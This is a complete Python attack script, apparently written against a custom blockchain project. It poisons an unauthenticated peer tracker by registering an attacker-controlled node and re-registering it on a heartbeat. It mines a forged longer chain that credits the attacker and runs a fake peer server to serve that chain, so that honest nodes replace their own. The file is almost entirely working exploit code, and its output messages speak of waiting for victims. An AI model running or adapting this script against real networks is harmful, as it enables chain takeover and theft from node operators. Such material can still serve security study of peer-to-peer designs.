#!/usr/bin/env python3
"""
Attack 2: Tracker Poisoning

Exploits:
  - POST /register on the Tracker accepts any URL with no authentication.
  - All real peers fetch the peer list via GET /peers and will connect to our
    malicious node.
  - Once listed as a peer, other nodes will pull our chain during initial_sync
    or heartbeat_loop, and we can serve them a forged chain.

Strategy:
  1. Register a malicious URL with the tracker
  2. All legitimate peers will discover our node on their next heartbeat
  3. We start a fake peer that serves a forged longer chain
  4. On next sync cycle, victims replace their chain with ours

This attack is the entry point for Attack 1 (chain replacement) — it ensures
the attacker is discovered by all peers automatically.
"""

import argparse
import hashlib
import json
import threading
import time
import sys
import os

import requests
from flask import Flask, jsonify

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from blockchain.block import Block
from blockchain.transaction import Transaction
from config import GENESIS_HASH, DIFFICULTY_BITS, HEARTBEAT_INTERVAL


def register_malicious_peer(tracker_url: str, malicious_url: str):
    """Register our malicious node with the tracker."""
    resp = requests.post(
        f"{tracker_url}/register",
        json={"url": malicious_url},
        timeout=5,
    )
    return resp.status_code, resp.json()


def verify_registration(tracker_url: str, malicious_url: str):
    """Check that our URL appears in the peer list."""
    resp = requests.get(f"{tracker_url}/peers", timeout=5)
    peers = resp.json().get("peers", [])
    return malicious_url in peers, peers


def forge_minimal_chain(num_blocks: int = 30):
    """Build a minimal valid chain that's longer than the typical victim's."""
    attacker_pubkey = "bb" * 32

    genesis = Block(
        index=0,
        previous_hash=GENESIS_HASH,
        transactions=[],
        timestamp=0.0,
        nonce=0,
        miner="genesis",
    )
    chain = [genesis]

    prefix = DIFFICULTY_BITS // 4
    for i in range(1, num_blocks + 1):
        prev = chain[-1]
        coinbase = Transaction.make_coinbase(attacker_pubkey)
        candidate = Block(
            index=i,
            previous_hash=prev.hash,
            transactions=[coinbase],
            timestamp=time.time(),
            nonce=0,
            miner=attacker_pubkey,
        )
        nonce = 0
        while True:
            candidate.nonce = nonce
            candidate.hash = candidate.compute_hash()
            if candidate.hash.startswith("0" * prefix):
                break
            nonce += 1
        chain.append(candidate)

    return chain


def start_malicious_peer(chain: list[Block], port: int):
    """Run a fake peer server that serves the forged chain and fake peer list."""
    app = Flask(__name__)
    chain_data = [blk.to_dict() for blk in chain]

    @app.route("/api/blocks", methods=["GET"])
    def get_blocks():
        return jsonify({"chain": chain_data}), 200

    @app.route("/api/peers", methods=["GET"])
    def get_peers():
        return jsonify({"peers": []}), 200

    @app.route("/api/health", methods=["GET"])
    def health():
        return jsonify({"status": "ok"}), 200

    @app.route("/api/transaction", methods=["POST"])
    def recv_tx():
        return jsonify({"status": "ok"}), 200

    @app.route("/api/block", methods=["POST"])
    def recv_block():
        return jsonify({"status": "ok", "appended": False}), 200

    app.run(host="0.0.0.0", port=port, debug=False)


def heartbeat_loop(tracker_url: str, malicious_url: str):
    """Keep re-registering so the tracker doesn't prune us."""
    while True:
        try:
            register_malicious_peer(tracker_url, malicious_url)
        except Exception:
            pass
        time.sleep(HEARTBEAT_INTERVAL // 2)


def main():
    parser = argparse.ArgumentParser(description="Attack 2: Tracker poisoning")
    parser.add_argument("--tracker", required=True, help="Tracker URL, e.g. http://192.168.1.100:5000")
    parser.add_argument("--attacker-url", required=True, help="Our reachable URL, e.g. http://192.168.1.200:9999")
    parser.add_argument("--serve-port", type=int, default=9999, help="Port for our malicious peer")
    parser.add_argument("--chain-length", type=int, default=30, help="Length of forged chain")
    args = parser.parse_args()

    print(f"[*] Registering {args.attacker_url} with tracker {args.tracker}...")
    status, body = register_malicious_peer(args.tracker, args.attacker_url)
    print(f"[+] Registration response: {status} {body}")

    found, peers = verify_registration(args.tracker, args.attacker_url)
    print(f"[*] Current peer list: {peers}")
    if found:
        print("[+] Our malicious node is in the peer list!")
    else:
        print("[-] Not found in peer list (may need to retry)")

    print(f"\n[*] Forging a chain of {args.chain_length} blocks...")
    forged_chain = forge_minimal_chain(args.chain_length)
    print(f"[+] Chain forged. Tip: block #{forged_chain[-1].index}, hash={forged_chain[-1].hash[:16]}...")

    print(f"\n[*] Starting heartbeat to keep registration alive...")
    hb = threading.Thread(
        target=heartbeat_loop,
        args=(args.tracker, args.attacker_url),
        daemon=True,
    )
    hb.start()

    print(f"[*] Starting malicious peer on port {args.serve_port}...")
    print(f"[*] Any peer that syncs with us will replace their chain with our {args.chain_length}-block forgery.")
    print(f"[*] Waiting for victims... (heartbeat interval is {HEARTBEAT_INTERVAL}s)")
    print(f"[*] Press Ctrl+C to stop.\n")

    start_malicious_peer(forged_chain, args.serve_port)


if __name__ == "__main__":
    main()
